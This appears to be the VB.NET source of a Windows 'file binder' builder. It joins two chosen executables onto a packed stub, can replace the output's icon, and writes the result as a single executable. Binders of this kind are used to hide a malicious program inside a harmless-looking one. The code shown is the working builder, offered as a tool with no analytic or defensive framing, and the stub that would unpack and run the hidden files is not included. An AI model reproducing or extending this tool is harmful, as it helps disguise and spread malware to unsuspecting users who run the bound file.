Imports System.IO
Public Class Form1
    Const ImaPimpBitch = "(^Dedadee^)"
    Dim stub, file1, file2, filen1, filen2, iconame As String
    Dim savefilename As String
    Private Sub CheckBox2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cb2.CheckedChanged
        If cb2.Checked = True Then
            icobox.Enabled = True
            Button4.Enabled = True
        Else : icobox.Enabled = False
            Button4.Enabled = False
        End If
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        ofd1.ShowDialog()
    End Sub
    Sub file1_ok() Handles ofd1.FileOk
        TextBox1.Text = ofd1.FileName
        filen1 = ofd1.FileName.Substring(ofd1.FileName.LastIndexOf("\") + 1)
    End Sub
    Sub button2_Click() Handles Button2.Click
        ofd2.ShowDialog()
    End Sub
    Sub file2_ok() Handles ofd2.FileOk
        TextBox2.Text = ofd2.FileName
        filen2 = ofd2.FileName.Substring(ofd2.FileName.LastIndexOf("\") + 1)
    End Sub
    Sub icons() Handles Button4.Click
        ofd3.ShowDialog()
    End Sub
    Sub icon_ok() Handles ofd3.FileOk
        icobox.Text = ofd3.FileName
        Dim theIcon As Icon = LoadIconFromFile(icobox.Text)
        PictureBox1.Image = theIcon.ToBitmap()
        theIcon.Dispose()

    End Sub
    Private Function LoadIconFromFile(ByVal fileName As String) As Icon
        Return New Icon(fileName) ' New Size(48, 48))
    End Function

    Sub bind_Stuff() Handles Button3.Click
        If TextBox1.Text = "" Then
            MessageBox.Show("You need to select two files!", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        If TextBox2.Text = "" Then
            MessageBox.Show("You need to select two files!", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        End If
        If cb2.Checked = True And icobox.Text = "" Then
            cb2.Checked = False
        End If
        sfd1.ShowDialog()
        If sfd1.FileName = "" Then Exit Sub
        GroupBox1.Enabled = False
        GroupBox2.Enabled = False
        Button3.Enabled = False
        Button5.Enabled = False
        bgw1.RunWorkerAsync()
    End Sub
    Sub savefilename1() Handles sfd1.FileOk
        savefilename = sfd1.FileName
    End Sub

    Sub drop()
        Try
            Dim b As Byte() = My.Resources.netz
            Dim TheFIlePath As String = Application.StartupPath & "\netz.exe"
            Dim TempFile As System.IO.FileStream = IO.File.Create(TheFIlePath)
            TempFile.Write(b, 0, b.Length)
            TempFile.Close()

            Dim b1 As Byte() = My.Resources.zip
            Dim TheFIlePath1 As String = Application.StartupPath & "\zip.dll"
            Dim TempFile1 As System.IO.FileStream = IO.File.Create(TheFIlePath1)
            TempFile1.Write(b1, 0, b1.Length)
            TempFile1.Close()

            Dim b2 As Byte() = My.Resources.defcomp
            Dim TheFIlePath2 As String = Application.StartupPath & "\defcomp.dll"
            Dim TempFile2 As System.IO.FileStream = IO.File.Create(TheFIlePath2)
            TempFile2.Write(b2, 0, b2.Length)
            TempFile2.Close()

            Dim b3 As Byte() = My.Resources.net20comp
            Dim TheFIlePath3 As String = Application.StartupPath & "\net20comp.dll"
            Dim TempFile3 As System.IO.FileStream = IO.File.Create(TheFIlePath3)
            TempFile3.Write(b3, 0, b3.Length)
            TempFile3.Close()

            Dim b4 As Byte() = My.Resources.subsys
            Dim TheFIlePath4 As String = Application.StartupPath & "\subsys.dll"
            Dim TempFile4 As System.IO.FileStream = IO.File.Create(TheFIlePath4)
            TempFile4.Write(b4, 0, b4.Length)
            TempFile4.Close()
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
    End Sub

    Sub delete_junk()
        If File.Exists(Application.StartupPath & "\subsys.dll") Then
            File.Delete(Application.StartupPath & "\subsys.dll")
        End If
        If File.Exists(Application.StartupPath & "\net20comp.dll") Then
            File.Delete(Application.StartupPath & "\net20comp.dll")
        End If
        If File.Exists(Application.StartupPath & "\defcomp.dll") Then
            File.Delete(Application.StartupPath & "\defcomp.dll")
        End If
        If File.Exists(Application.StartupPath & "\zip.dll") Then
            File.Delete(Application.StartupPath & "\zip.dll")
        End If
        If File.Exists(Application.StartupPath & "\netz.exe") Then
            File.Delete(Application.StartupPath & "\netz.exe")
        End If

    End Sub

    Private Sub bgw1_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bgw1.DoWork



        If cb2.Checked = True Then
            File.Copy(icobox.Text, "c:\1.ico", True)
        End If
        
        FileOpen(1, TextBox1.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        file1 = Space(LOF(1))
        FileGet(1, file1)
        FileClose(1)
        label1.Text = "Getting File #1"

        FileOpen(2, TextBox2.Text, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        file2 = Space(LOF(2))
        FileGet(2, file2)
        FileClose(2)
        label1.Text = "Getting File #2"

        FileOpen(3, Application.StartupPath & "\A+Stub.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
        stub = Space(LOF(3))
        FileGet(3, stub)
        FileClose(3)
        If File.Exists(savefilename) = True Then
            File.Delete(savefilename)
        End If
        
        If File.Exists(("c:\1.exe")) = True Then
            File.Delete(("c:\1.exe"))
        End If
        label1.Text = "A little House Keeping"
        drop()
        Try
            FileOpen(1, "c:\1.exe", OpenMode.Binary)
            FilePut(1, stub)
            FileClose(1)
            label1.Text = "Packing File"
            Dim Proc As Process = New Process
            Dim top As String = Application.StartupPath & "\netz.exe"
            Proc.StartInfo.FileName = top
            Proc.StartInfo.UseShellExecute = False
            Proc.StartInfo.RedirectStandardOutput = True
            Proc.StartInfo.CreateNoWindow = True
            If cb2.Checked = True Then
                Proc.StartInfo.Arguments = "-z -i c:\1.ico c:\1.exe"
            Else : Proc.StartInfo.Arguments = "-z c:\1.exe"
            End If

            Proc.Start()
            Proc.WaitForExit()
            delete_junk()
            If cb2.Checked = True Then
                label1.Text = "Aplying Icon"
            End If

            My.Computer.FileSystem.MoveFile("C:\1.exe.netz\1.exe", Application.StartupPath & "\1.exe", True)
            System.Threading.Thread.Sleep(1000)
            FileOpen(1, Application.StartupPath & "\1.exe", OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            label1.Text = "Cleaning up"
            Kill(Application.StartupPath & "\1.exe")
            File.Delete(Application.StartupPath & "\1.exe")
            FileOpen(1, savefilename, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, stub & filesplit & file1 & filesplit & filen1 & filesplit & file2 & filesplit & filen2)
            FileClose(1)

        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
        If File.Exists("C:\1.ico") = True Then
            File.Delete("C:\1.ico")
        End If

        If File.Exists(("c:\1.exe")) = True Then
            File.Delete(("c:\1.exe"))
        End If
        If Directory.Exists(("c:\1.exe.netz")) = True Then
            Directory.Delete(("c:\1.exe.netz"))
        End If

    End Sub

    Sub donework() Handles bgw1.RunWorkerCompleted
        label1.Text = "Done"
        MsgBox("Binded")
        GroupBox1.Enabled = True
        GroupBox2.Enabled = True
        Button3.Enabled = True
        Button5.Enabled = True
        label1.Text = "Idle"
        Me.Close()
        End
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Me.Close()
    End Sub

   
End Class
